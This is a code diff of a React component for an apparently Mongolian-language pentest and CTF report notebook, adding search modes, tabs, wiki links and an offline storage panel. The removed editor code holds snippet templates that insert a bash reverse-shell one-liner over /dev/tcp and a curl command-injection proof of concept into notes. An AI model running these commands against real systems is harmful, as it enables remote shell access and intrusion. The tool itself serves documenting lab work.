     const calculatedExcerpt =
-      newContent
+      data.content
         .replace(/^#+\s+/gm, "")
         .replace(/\s+/g, " ")
         .slice(0, 140) || "Шинэ тайлангийн тэмдэглэл.";
 
-    if (editingReportId) {
+    const editingId = editorInit?.report?.id ?? null;
+    if (editingId) {
       setReports(current =>
         current.map(item =>
-          item.id === editingReportId
+          item.id === editingId
             ? {
                 ...item,
-                title: newTitle.trim(),
-                room: newRoom.trim() || "Unassigned room",
-                source: newSource,
-                stage: newStage,
-                content: newContent,
+                title: data.title,
+                room: data.room || "Unassigned room",
+                source: data.source,
+                stage: data.stage,
+                content: data.content,
                 excerpt: calculatedExcerpt,
                 readTime: calculatedReadTime,
-                image: attachment,
-                category: newTrackId,
+                image: data.image,
+                imageRef: data.imageRef,
+                category: data.trackId,
               }
             : item
         )
       );
-      touchReportMeta(workspaceKey, editingReportId);
+      touchReportMeta(workspaceKey, editingId);
+      openTab(editingId);
       toast.success("Тайлан амжилттай шинэчлэгдлээ!");
     } else {
       const report: Report = {
         id: Date.now(),
-        title: newTitle.trim(),
-        room: newRoom.trim() || "Unassigned room",
-        source: newSource,
-        stage: newStage,
+        title: data.title,
+        room: data.room || "Unassigned room",
+        source: data.source,
+        stage: data.stage,
         tags: Array.from(
           new Set([
-            `roadmap-${newTrackId}`,
-            `section-${newTrackSectionId}`,
-            ...newCoreTags.split(",").map(tag => tag.trim().toLowerCase().replace(/\s+/g, "-")).filter(Boolean),
-            ...(reportTemplates.find(item => item.key === templateKey)?.tags || [
-              "field-notes",
-            ]),
+            `roadmap-${data.trackId}`,
+            `section-${data.sectionId}`,
+            ...data.coreTags.split(",").map(tag => tag.trim().toLowerCase().replace(/\s+/g, "-")).filter(Boolean),
+            ...templateByKey(data.templateKey).tags,
           ])
         ),
         status: "Draft",
         readTime: calculatedReadTime,
         date: formatReportDate(new Date()),
         excerpt: calculatedExcerpt,
-        content: newContent,
-        image: attachment,
-        category: newTrackId,
+        content: data.content,
+        image: data.image,
+        imageRef: data.imageRef,
+        category: data.trackId,
       };
       setReports(current => [report, ...current]);
       touchReportMeta(workspaceKey, report.id);
-      setSelectedId(report.id);
+      openTab(report.id);
       toast.success("Шинэ тайлан амжилттай үүсгэгдлээ!");
     }
     setEditorOpen(false);
     setActiveNav("Тайлан");
   }
 
+  // --- Search 2.0 helpers ---
+  const FIELD_ALIASES: Record<FilterChip["field"], string[]> = {
+    tags: ["tag", "tags"],
+    stages: ["stage"],
+    statuses: ["status", "state"],
+    sources: ["source", "src"],
+    dates: ["date", "day"],
+  };
+
+  function removeFilterChip(chip: FilterChip) {
+    const aliases = FIELD_ALIASES[chip.field] ?? [];
+    const escaped = chip.value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+    const pattern = new RegExp(`(?:${aliases.join("|")}):"?${escaped}"?\\s*`, "i");
+    setQuery(current => current.replace(pattern, "").replace(/\s+/g, " ").trim());
+  }
+
+  function openRandomReport() {
+    const pool = filteredReports.length > 0 ? filteredReports : visibleReports;
+    if (!pool.length) return;
+    const pick = pool[Math.floor(Math.random() * pool.length)];
+    openTab(pick.id);
+    setActiveNav("Тайлан");
+    toast.info(`🎲 «${pick.title}»`);
+  }
+
+  function refreshCloudVectors() {
+    refreshCloudVectorsMutation.mutate(
+      { workspaceKey, batch: 12 },
+      {
+        onSuccess: result => {
+          toast.success(`Вектор сан шинэчлэгдлээ: ${result.updated} шинэ / ${result.scanned} нийт`);
+          trpcUtils.ai.semantic.status.invalidate({ workspaceKey });
+          trpcUtils.ai.semantic.search.invalidate();
+        },
+        onError: () => toast.error("Вектор шинэчлэл амжилтгүй"),
+      }
+    );
+  }
+
   function deleteReport(id: number) {
     if (guardPublicMode()) return;
+    setOpenTabs(current => current.filter(t => t !== id));
+    tabScroll.current.delete(id);
     setReports(current => {
       const next = current.filter(r => r.id !== id);
       if (selectedId === id && next.length > 0) {
@@ -1566,7 +1783,7 @@ export default function Home() {
     if (!selectedReport || filteredReports.length < 2) return;
     const currentIndex = filteredReports.findIndex(report => report.id === selectedReport.id);
     const nextIndex = (currentIndex + direction + filteredReports.length) % filteredReports.length;
-    setSelectedId(filteredReports[nextIndex].id);
+    openTab(filteredReports[nextIndex].id);
   }
 
   function handleObsidianImport(event: ChangeEvent<HTMLInputElement>) {
@@ -1596,7 +1813,7 @@ export default function Home() {
       };
       setReports(current => [imported, ...current]);
       touchReportMeta(workspaceKey, imported.id);
-      setSelectedId(imported.id);
+      openTab(imported.id);
       setActiveNav("Тайлан");
       toast.success(`"${imported.title}" амжилттай импортлогдлоо!`);
     };
@@ -1748,7 +1965,7 @@ export default function Home() {
       )
       .sort((a, b) => b.r.id - a.r.id);
     if (dayReports.length) {
-      setSelectedId(dayReports[0].r.id);
+      openTab(dayReports[0].r.id);
       setActiveNav("Тайлан");
       toast.info(`${displayed.month + 1}-р сарын ${day}: ${dayReports.length} тайлан олдлоо`);
     } else {
@@ -1764,20 +1981,21 @@ export default function Home() {
     const q = commandSearch.toLowerCase();
     const matches: { title: string; subtitle: string; category: string; onSelect: () => void }[] = [];
 
-    visibleReports.forEach(r => {
-      if (r.title.toLowerCase().includes(q) || r.tags.some(t => t.toLowerCase().includes(q))) {
+    // Reports use the typo-tolerant fuzzy engine (Search 2.0).
+    rankFuzzy(visibleReports, parseSearchQuery(commandSearch))
+      .slice(0, 8)
+      .forEach(({ report: r }) => {
         matches.push({
           title: r.title,
           subtitle: `${r.source} / ${r.room}`,
           category: "Тайлан",
           onSelect: () => {
-            setSelectedId(r.id);
+            openTab(r.id);
             setActiveNav("Тайлан");
             setCommandPaletteOpen(false);
           },
         });
-      }
-    });
+      });
 
     playbooks.forEach(p => {
       if (p.title.toLowerCase().includes(q) || p.description.toLowerCase().includes(q)) {
@@ -1944,6 +2162,11 @@ export default function Home() {
             <strong>{activeNav}</strong>
           </div>
           <div className="top-actions" style={{ position: "relative" }}>
+            {!isOnline && (
+              <span className="offline-pill" title="Интернэт холболт тасарсан — локал сан үргэлжлүүлэн ажиллаж байна">
+                <WifiOff size={13} /> OFFLINE
+              </span>
+            )}
             <button
               className={`icon-button public-toggle ${publicView ? "active" : ""}`}
               onClick={() => setPublicViewMode(!publicView)}
@@ -2048,7 +2271,7 @@ export default function Home() {
               <div
                 className="hero-brief clickable-card"
                 onClick={() => {
-                  setSelectedId(1);
+                  openTab(1);
                   setActiveNav("Тайлан");
                 }}
                 title="Шууд тайлан руу шилжих"
@@ -2417,12 +2640,12 @@ export default function Home() {
                 setReports(next);
                 saveReports(next);
                 touchReportMeta(workspaceKey, newId);
-                setSelectedId(newId);
+                openTab(newId);
                 setActiveNav("Тайлан");
                 toast.success("Шинэ олдвор тайлангийн санд нэмэгдлээ!");
               }}
               onSelectReport={reportId => {
-                setSelectedId(reportId);
+                openTab(reportId);
                 setActiveNav("Тайлан");
               }}
             />
@@ -2440,6 +2663,13 @@ export default function Home() {
                 <p>Нэвтрэх туршилт, CTF болон лабын дүн шинжилгээний бүртгэлүүд.</p>
               </div>
               <div className="report-header-actions">
+                <button
+                  className="secondary-button"
+                  onClick={openRandomReport}
+                  title="Санамсаргүй тэмдэглэл нээх"
+                >
+                  <Dices size={14} /> Санамсаргүй
+                </button>
                 {!publicView && (
                   <>
                     <input
@@ -2475,6 +2705,8 @@ export default function Home() {
               </div>
             </div>
 
+            <ReportTabs tabs={validTabs} activeId={selectedId} titles={tabTitles} onActivate={activateTab} onClose={closeTab} />
+
             <div className="reports-layout">
               <div className="report-list-panel">
                 <div className="report-toolbar">
@@ -2483,7 +2715,7 @@ export default function Home() {
                     <input
                       value={query}
                       onChange={event => setQuery(event.target.value)}
-                      placeholder="Тайлан хайх (гарчиг, room, шошго)..."
+                      placeholder="Хайх… (tag: stage: status: source: date: шүүлтүүр)"
                     />
                     {query && (
                       <button
@@ -2494,6 +2726,60 @@ export default function Home() {
                       </button>
                     )}
                   </div>
+                  <div className="search-mode-row">
+                    <div className="segmented small" role="tablist" aria-label="Хайлтын горим">
+                      <button
+                        role="tab"
+                        aria-selected={searchMode === "fuzzy"}
+                        className={searchMode === "fuzzy" ? "selected" : ""}
+                        onClick={() => setSearchMode("fuzzy")}
+                        title="Үсгийн алдаа тэсвэртэй түлхүүр үгийн хайлт"
+                      >
+                        Fuzzy
+                      </button>
+                      <button
+                        role="tab"
+                        aria-selected={searchMode === "semantic"}
+                        className={searchMode === "semantic" ? "selected" : ""}
+                        onClick={() => setSearchMode("semantic")}
+                        title="Утгаар хайх — асуултын утгатай дүйцэх тэмдэглэл (offline)"
+                      >
+                        <Brain size={12} /> Утга
+                      </button>
+                      <button
+                        role="tab"
+                        aria-selected={searchMode === "hybrid"}
+                        className={searchMode === "hybrid" ? "selected" : ""}
+                        onClick={() => setSearchMode("hybrid")}
+                        title="Fuzzy + семантик хосолсон эрэмбэ"
+                      >
+                        Hybrid
+                      </button>
+                    </div>
+                    {searchMode !== "fuzzy" && (
+                      <span
+                        className="ai-badge"
+                        title={
+                          semanticProvider === "openrouter+local"
+                            ? `Клауд трансформер векторууд (${semanticStatus.data?.cloud.model}) + локал`
+                            : "Локал векторууд — интернетгүй ажиллана"
+                        }
+                      >
+                        🧠 {semanticProvider === "openrouter+local" ? "OpenRouter" : "Локал"}
+                      </span>
+                    )}
+                    {semanticStatus.data?.cloud.configured && (
+                      <button
+                        className="text-btn-tiny"
+                        onClick={refreshCloudVectors}
+                        disabled={refreshCloudVectorsMutation.isPending}
+                        title="Клауд векторуудыг урьдчилан тооцоолох (OpenRouter)"
+                      >
+                        <RotateCcw size={11} /> Векторууд
+                      </button>
+                    )}
+                  </div>
+                  <FilterChips filters={parsedQuery.filters} onRemove={removeFilterChip} />
                   <div className="filter-pills">
                     <button
                       className={statusFilter === "All" ? "selected" : ""}
@@ -2572,7 +2858,13 @@ export default function Home() {
                 </div>
 
                 <div className="list-meta">
-                  <span>Нийт {filteredReports.length} тайлан</span>
+                  <span>
+                    Нийт {filteredReports.length} тайлан
+                    {searchActive && <span className="search-hint"> · хамаарлаар эрэмбэлсэн</span>}
+                    {!searchActive && hasActiveFilters(parsedQuery.filters) && (
+                      <span className="search-hint"> · шүүлтүүр идэвхтэй</span>
+                    )}
+                  </span>
                   <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                     <span style={{ color: "var(--muted)" }}>Эрэмбэ:</span>
                     <select
@@ -2604,40 +2896,63 @@ export default function Home() {
                         setQuery("");
                         setStatusFilter("All");
                         setTagFilter("All");
+                        setTrackFilter("All");
                       }}
                     >
                       Шүүлтүүрийг арилгах
                     </button>
                   </div>
                 ) : (
-                  filteredReports.map(report => (
-                    <button
-                      key={report.id}
-                      className={`report-list-item ${selectedReport?.id === report.id ? "selected" : ""}`}
-                      onClick={() => setSelectedId(report.id)}
-                    >
-                      <div className="report-item-icon">
-                        <FileText size={16} />
-                      </div>
-                      <div className="report-item-copy">
-                        <div className="report-item-head">
-                          <strong>{report.title}</strong>
-                          <span
-                            className={`status-pill ${report.status.toLowerCase()}`}
-                          >
-                            {report.status}
-                          </span>
+                  filteredReports.map(report => {
+                    const snippet = searchSnippets.get(report.id);
+                    const score = searchScores.get(report.id);
+                    const titleHit = searchActive && snippet?.field === "title";
+                    return (
+                      <button
+                        key={report.id}
+                        className={`report-list-item ${selectedReport?.id === report.id ? "selected" : ""}`}
+                        onClick={() => openTab(report.id)}
+                      >
+                        <div className="report-item-icon">
+                          <FileText size={16} />
                         </div>
-                        <span className="report-excerpt">{report.excerpt}</span>
-                        <div className="report-item-meta">
-                          <span>
-                            {report.source} / {report.room}
+                        <div className="report-item-copy">
+                          <div className="report-item-head">
+                            <strong>
+                              {titleHit && snippet ? (
+                                <SnippetText text={snippet.text} ranges={snippet.ranges} />
+                              ) : (
+                                report.title
+                              )}
+                            </strong>
+                            <span
+                              className={`status-pill ${report.status.toLowerCase()}`}
+                            >
+                              {report.status}
+                            </span>
+                          </div>
+                          <span className="report-excerpt">
+                            {searchActive && snippet && !titleHit ? (
+                              <SnippetText text={snippet.text} ranges={snippet.ranges} />
+                            ) : (
+                              report.excerpt
+                            )}
                           </span>
-                          <span>{report.date}</span>
+                          <div className="report-item-meta">
+                            <span>
+                              {report.source} / {report.room}
+                            </span>
+                            <span>{report.date}</span>
+                            {searchActive && score !== undefined && (
+                              <span className="search-score" title="Хайлтын хамаарал">
+                                {Math.round(score * 100)}%
+                              </span>
+                            )}
+                          </div>
                         </div>
-                      </div>
-                    </button>
-                  ))
+                      </button>
+                    );
+                  })
                 )}
               </div>
 
@@ -2738,14 +3053,13 @@ export default function Home() {
                     </button>
 
                     <div className="detail-divider" />
-                    <MarkdownPreview content={selectedReport.content} />
-                    {selectedReport.image && (
-                      <img
-                        className="report-image"
-                        src={selectedReport.image}
-                        alt="Report attachment"
-                      />
-                    )}
+                    <WikiMarkdown
+                      content={selectedReport.content}
+                      reports={visibleReports}
+                      onOpenReport={id => openTab(id)}
+                      onCreateReport={openCreateReportForTitle}
+                    />
+                    <ReportImage image={selectedReport.image} imageRef={selectedReport.imageRef} />
 
                     <div className="detail-actions">
                       <button
@@ -2818,6 +3132,12 @@ export default function Home() {
                         </div>
                       </div>
                     )}
+
+                    <BacklinksPanel
+                      reportId={selectedReport.id}
+                      reports={visibleReports}
+                      onOpenReport={id => openTab(id)}
+                    />
                   </>
                 ) : (
                   <div style={{ padding: "40px", textAlign: "center", color: "var(--muted)" }}>
@@ -2857,6 +3177,8 @@ export default function Home() {
                     </button>
                   </div>
                 </div>
+
+                <ReportTabs tabs={validTabs} activeId={selectedId} titles={tabTitles} onActivate={activateTab} onClose={closeTab} />
 
                 <div className="reader-actions-top">
                   <button className="export-button" onClick={exportSelectedMarkdown}>
@@ -2901,10 +3223,13 @@ export default function Home() {
                     ))}
                   </div>
                   <div className="detail-divider" />
-                  <MarkdownPreview content={selectedReport.content} />
-                  {selectedReport.image && (
-                    <img className="report-image" src={selectedReport.image} alt="Report attachment" />
-                  )}
+                  <WikiMarkdown
+                    content={selectedReport.content}
+                    reports={visibleReports}
+                    onOpenReport={id => openTab(id)}
+                    onCreateReport={openCreateReportForTitle}
+                  />
+                  <ReportImage image={selectedReport.image} imageRef={selectedReport.imageRef} />
 
                   {relatedNotes.length > 0 && (
                     <div className="related-strip">
@@ -2918,6 +3243,11 @@ export default function Home() {
                       </div>
                     </div>
                   )}
+                  <BacklinksPanel
+                    reportId={selectedReport.id}
+                    reports={visibleReports}
+                    onOpenReport={id => openTab(id)}
+                  />
                 </article>
               </>
             ) : (
@@ -3234,7 +3564,7 @@ export default function Home() {
               </div>
               <div className="ai-brain-providers">
                 <span>Gemini: {atlasQuery.data?.configured ? "идэвхтэй" : "local fallback"}</span>
-                <span>Insights: {insightsQuery.data?.relations.length ?? 0} холбоос</span>
+                <span>Insights: {atlasInsights?.relations.length ?? 0} холбоос (wiki: {wikiEdgeCount})</span>
                 <button className="secondary-button" onClick={refreshInsights} disabled={refreshInsightsMutation.isPending}>
                   <RotateCcw size={13} /> Шинэчлэх
                 </button>
@@ -3246,7 +3576,7 @@ export default function Home() {
               trackProgress={trackProgress}
               onOpenReport={openReportInReader}
               onOpenTrack={openTrackInRoadmap}
-              insights={insightsQuery.data ?? null}
+              insights={atlasInsights}
               onRefreshInsights={refreshInsights}
               refreshing={refreshInsightsMutation.isPending || insightsQuery.isFetching}
             />
@@ -3456,213 +3786,18 @@ export default function Home() {
         }}
       />
 
-      {editorOpen && (
-        <div
-          className="editor-overlay"
-          onClick={event => {
-            if (event.target === event.currentTarget) setEditorOpen(false);
-          }}
-        >
-          <div className="editor-panel">
-            <div className="editor-head">
-              <div>
-                <div className="section-kicker">
-                  {editingReportId ? "Тайлан засах" : "Шинэ тайлан"}
-                </div>
-                <h2>
-                  {editingReportId ? "Тайлангийн агуулгыг шинэчлэх" : "Шинэ тайлан үүсгэх"}
-                </h2>
-              </div>
-              <button
-                className="icon-button"
-                onClick={() => setEditorOpen(false)}
-              >
-                <X size={17} />
-              </button>
-            </div>
-
-            {!editingReportId && (
-              <>
-                <label>
-                  Загвар сонгох
-                  <select
-                    value={templateKey}
-                    onChange={event => applyTemplate(event.target.value)}
-                  >
-                    {reportTemplates.map(template => (
-                      <option key={template.key} value={template.key}>
-                        {template.label}
-                      </option>
-                    ))}
-                  </select>
-                </label>
-                <div className="template-note">
-                  <Sparkles size={13} /> Бүтэц, эх сурвалж, үе шат болон шошгыг автоматаар бөглөнө. Хадгалахаасаа өмнө хүссэнээрээ засах боломжтой.
-                </div>
-              </>
-            )}
-
-            <label>
-              Тайлангийн гарчиг
-              <input
-                value={newTitle}
-                onChange={event => setNewTitle(event.target.value)}
-                placeholder="Жишээ: SSRF: trust boundary notes"
-                autoFocus
-              />
-            </label>
-            <div className="two-fields">
-              <label>
-                Room / Лаб
-                <input
-                  value={newRoom}
-                  onChange={event => setNewRoom(event.target.value)}
-                  placeholder="Room / challenge"
-                />
-              </label>
-              <label>
-                Эх сурвалж
-                <select
-                  value={newSource}
-                  onChange={event => setNewSource(event.target.value as Report["source"])}
-                >
-                  <option>THM</option>
-                  <option>picoCTF</option>
-                  <option>HTB</option>
-                  <option>Cloud</option>
-                  <option>Cyber</option>
-                </select>
-              </label>
-            </div>
-            <div className="two-fields">
-              <label>
-                Roadmap чиглэл
-                <select
-                  value={newTrackId}
-                  onChange={event => {
-                    applyTrackDefaults(event.target.value);
-                  }}
-                >
-                  {roadmapTracks.map(track => (
-                    <option key={track.id} value={track.id}>{track.name}</option>
-                  ))}
-                </select>
-              </label>
-              <label>
-                Section / category
-                <select
-                  value={newTrackSectionId}
-                  onChange={event => setNewTrackSectionId(event.target.value)}
-                >
-                  {selectedEditorTrack().sections.map(section => (
-                    <option key={section.id} value={section.id}>{section.label}: {section.title}</option>
-                  ))}
-                </select>
-              </label>
-            </div>
-            <label>
-              Core tag-ууд
-              <input
-                value={newCoreTags}
-                onChange={event => setNewCoreTags(event.target.value)}
-                placeholder="жишээ: suid, cron, enumeration"
-              />
-            </label>
-            <div className="template-note">
-              <Sparkles size={13} /> Roadmap чиглэл, section, core tag нь report filter, Atlas, chatbot-д автоматаар ашиглагдана.
-            </div>
-            <label>
-              Үе шат
-              <select
-                value={newStage}
-                onChange={event => setNewStage(event.target.value)}
-              >
-                <option>Foundations</option>
-                <option>Live Fire</option>
-                <option>Deep Offensive</option>
-                <option>Pro Arena</option>
-                <option>Deployment</option>
-              </select>
-            </label>
-            <label>
-              Агуулга (Markdown)
-              <div style={{ display: "flex", gap: 6, margin: "6px 0", flexWrap: "wrap" }}>
-                <button
-                  type="button"
-                  className="text-btn-tiny"
-                  onClick={() => {
-                    const snippet = `\n### 🛡️ Олдвор: [Эмзэг байдлын нэр]\n- **Үнэлгээ (Severity):** HIGH (CVSS 7.8)\n- **CVSS Vector:** \`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\`\n- **Зорилтот систем:** \`${pentestConfig.rhost}:${pentestConfig.rport}\`\n\n#### Тодорхойлолт\n\n\n#### Баталгаажуулалт (PoC)\n\`\`\`bash\ncurl -X POST http://${pentestConfig.rhost}:${pentestConfig.rport}/api -d "cmd=id"\n\`\`\`\n\n#### Засварлах зөвлөмж\n\n`;
-                    setNewContent(prev => prev + snippet);
-                    toast.success("CVSS Олдворын загвар нэмэгдлээ");
-                  }}
-                >
-                  <ShieldAlert size={11} /> + CVSS Олдвор
-                </button>
-                <button
-                  type="button"
-                  className="text-btn-tiny"
-                  onClick={() => {
-                    const snippet = `\n### 🎯 Нээлттэй портууд (${pentestConfig.rhost})\n| Порт | Протокол | Төлөв | Үйлчилгээ | Хувилбар |\n| :--- | :--- | :--- | :--- | :--- |\n| \`22\` | TCP | open | ssh | OpenSSH |\n| \`80\` | TCP | open | http | Web Server |\n| \`445\` | TCP | open | smb | Samba |\n`;
-                    setNewContent(prev => prev + snippet);
-                    toast.success("Портын хүснэгт нэмэгдлээ");
-                  }}
-                >
-                  <Terminal size={11} /> + Портын хүснэгт
-                </button>
-                <button
-                  type="button"
-                  className="text-btn-tiny"
-                  onClick={() => {
-                    const snippet = `\n\`\`\`bash\n# Reverse Shell (LHOST=${pentestConfig.lhost}, LPORT=${pentestConfig.lport})\nbash -i >& /dev/tcp/${pentestConfig.lhost}/${pentestConfig.lport} 0>&1\n\`\`\`\n`;
-                    setNewContent(prev => prev + snippet);
-                    toast.success("Reverse Shell нэмэгдлээ");
-                  }}
-                >
-                  <Flame size={11} /> + Reverse Shell
-                </button>
-              </div>
-              <textarea
-                value={newContent}
-                onChange={event => setNewContent(event.target.value)}
-                rows={12}
-              />
-            </label>
-            <div className="attachment-row">
-              <input
-                ref={fileInput}
-                type="file"
-                accept="image/*"
-                onChange={handleAttachment}
-                hidden
-              />
-              {attachment ? (
-                <div className="attachment-preview">
-                  <img src={attachment} alt="Attachment preview" />
-                  <button onClick={() => setAttachment(undefined)}>
-                    <X size={13} />
-                  </button>
-                </div>
-              ) : (
-                <button
-                  className="attachment-button"
-                  onClick={() => fileInput.current?.click()}
-                >
-                  <ImagePlus size={16} /> Скриншот хавсаргах
-                </button>
-              )}
-              <span className="mono">PNG / JPG / WEBP</span>
-            </div>
-            <div className="editor-footer">
-              <span className="editor-hint">
-                <Paperclip size={13} /> Ноорогтой хамт хадгалагдана
-              </span>
-              <button className="primary-button" onClick={saveReport}>
-                {editingReportId ? "Өөрчлөлтийг хадгалах" : "Хадгалах"}{" "}
-                <ArrowUpRight size={14} />
-              </button>
-            </div>
-          </div>
-        </div>
+      {editorOpen && editorInit && (
+        <SplitEditor
+          key={`editor-${editorInit.report?.id ?? "new"}-${editorNonce}`}
+          editing={editorInit.report}
+          preset={editorInit.preset}
+          reports={reports}
+          previewReports={visibleReports}
+          tracks={roadmapTracks}
+          pentestConfig={pentestConfig}
+          onSave={saveEditorReport}
+          onClose={() => setEditorOpen(false)}
+        />
       )}
 
       {selectedPlaybook && (
@@ -4043,6 +4178,28 @@ export default function Home() {
                 <p style={{ fontSize: 10, color: "var(--muted)", margin: "6px 0 0", lineHeight: 1.5 }}>
                   Ижил түлхүүртэй төхөөрөмжүүд нэг өгөгдлийн сан хуваалцана. Түлхүүрээ
                   хэнд ч хуваалцахгүй байгаарай — эзлэх хэн ч тайланг засч болно.
+                </p>
+              </div>
+
+              <div style={{ marginTop: 16 }}>
+                <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", marginBottom: 6 }}>
+                  ЛОКАЛ САН (OFFLINE-FIRST)
+                </div>
+                {vaultInfo ? (
+                  <div className="vault-status-grid">
+                    <span>
+                      Backend: {vaultInfo.backend === "indexeddb" ? "IndexedDB (GB багтаамж)" : vaultInfo.backend}
+                    </span>
+                    <span>Түлхүүр: {vaultInfo.kvKeys} · Зураг: {vaultInfo.images}</span>
+                    <span>
+                      Хэрэглээ: {formatBytes(vaultInfo.usageBytes)} / {formatBytes(vaultInfo.quotaBytes)}
+                    </span>
+                  </div>
+                ) : (
+                  <span style={{ fontSize: 11, color: "var(--muted)" }}>Ачааллаж байна…</span>
+                )}
+                <p style={{ fontSize: 10, color: "var(--muted)", margin: "6px 0 0", lineHeight: 1.5 }}>
+                  Тэмдэглэл, зураг бүр хөтөч дотор хадгалагддаг — интернетгүй үед ч систем 100% ажиллана.
                 </p>
               </div>
 
